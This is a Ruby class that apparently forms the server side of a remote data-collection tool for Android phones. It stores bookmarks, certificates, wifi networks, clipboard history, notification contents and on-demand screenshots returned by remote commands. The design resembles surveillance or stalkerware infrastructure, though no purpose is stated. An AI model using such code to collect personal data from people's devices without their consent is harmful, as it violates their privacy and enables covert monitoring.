# frozen_string_literal: true

# Processes data collection responses from Android devices:
# bookmarks, certificates, wifi networks, clipboard entries, and screenshots.
class DataCollectionResponseProcessor
  def initialize(pending_command, response)
    @pending_command = pending_command
    @response = response
    @smartphone = pending_command.smartphone
  end

  def process
    case @pending_command.command
    when 'get_bookmarks'
      process_bookmarks
    when 'get_certificates'
      process_certificates
    when 'get_wifi_networks'
      process_wifi_networks
    when 'get_clipboard_history'
      process_clipboard_history
    when 'take_on_demand_screenshot'
      process_screenshot
    when 'get_notifications'
      process_notifications
    else
      @pending_command.mark_failed("Unknown data collection command: #{@pending_command.command}")
    end
  rescue StandardError => e
    @pending_command.mark_failed("Failed to process data collection: #{e.message}")
  end

  private

  def process_bookmarks
    items = @response['bookmarks'] || []
    items.each do |b|
      Bookmark.find_or_create_by!(
        smartphone: @smartphone,
        url: b['url']
      ) do |bookmark|
        bookmark.title = b['title']
        bookmark.browser = b['browser']
        bookmark.folder = b['folder']
        bookmark.bookmarked_at = parse_timestamp(b['bookmarked_at'])
      end
    end
    @pending_command.mark_completed(@response.merge('bookmarks_count' => items.size))
  end

  def process_certificates
    items = @response['certificates'] || []
    items.each do |c|
      Certificate.find_or_create_by!(
        smartphone: @smartphone,
        fingerprint_sha256: c['fingerprint_sha256']
      ) do |cert|
        cert.subject = c['subject']
        cert.issuer = c['issuer']
        cert.serial_number = c['serial_number']
        cert.valid_from = parse_timestamp(c['valid_from'])
        cert.valid_to = parse_timestamp(c['valid_to'])
        cert.is_system = c['is_system'] || false
        cert.is_trusted = c['is_trusted'].nil? ? true : c['is_trusted']
      end
    end
    @pending_command.mark_completed(@response.merge('certificates_count' => items.size))
  end

  def process_wifi_networks
    items = @response['wifi_networks'] || []
    items.each do |w|
      network = WifiNetwork.find_or_initialize_by(
        smartphone: @smartphone,
        ssid: w['ssid']
      )
      network.assign_attributes(
        bssid: w['bssid'],
        security_type: w['security_type'],
        signal_strength: w['signal_strength'],
        is_connected: w['is_connected'] || false,
        is_saved: w['is_saved'] || false,
        first_seen_at: network.first_seen_at || parse_timestamp(w['first_seen_at']) || Time.current,
        last_connected_at: w['is_connected'] ? Time.current : network.last_connected_at
      )
      network.save!
    end
    @pending_command.mark_completed(@response.merge('wifi_networks_count' => items.size))
  end

  def process_clipboard_history
    items = @response['clipboard_entries'] || @response['clipboard_history'] || []
    items.each do |c|
      ClipboardEntry.create!(
        smartphone: @smartphone,
        content: c['content'] || c['text'],
        source_app: c['source_app'],
        captured_at: parse_timestamp(c['captured_at'] || c['timestamp']) || Time.current
      )
    end
    @pending_command.mark_completed(@response.merge('clipboard_entries_count' => items.size))
  end

  def process_screenshot
    screenshot_data = @response['screenshot'] || @response['image_data']
    return @pending_command.mark_failed('No screenshot data') unless screenshot_data.present?

    timestamp = Time.current.strftime('%Y-%m-%d_%H--%M--%S')
    filename = "screenshot_#{timestamp}.png"
    file_path = Rails.root.join('files', 'dumps', 'screenshots', filename)
    FileUtils.mkdir_p(File.dirname(file_path))

    File.binwrite(file_path, Base64.decode64(screenshot_data))

    Screenshot.create!(
      date: timestamp.gsub('_', ' ').gsub('--', ':'),
      filename: filename,
      smartphone_id: @smartphone.id
    )

    @pending_command.mark_completed(@response.merge('screenshot_file' => filename))
  end

  def process_notifications
    items = @response['notifications'] || []
    items.each do |n|
      DeviceNotification.create!(
        smartphone: @smartphone,
        app_name: n['app_name'] || n['package_name'],
        title: n['title'],
        content: n['content'] || n['text'],
        received_at: parse_timestamp(n['timestamp']) || Time.current
      )
    end
    @pending_command.mark_completed(@response.merge('notifications_count' => items.size))
  end

  def parse_timestamp(value)
    return nil if value.blank?
    return Time.at(value.to_i / 1000) if value.is_a?(Numeric) || value.to_s =~ /\A\d+\z/

    Time.parse(value.to_s)
  rescue ArgumentError
    nil
  end
end
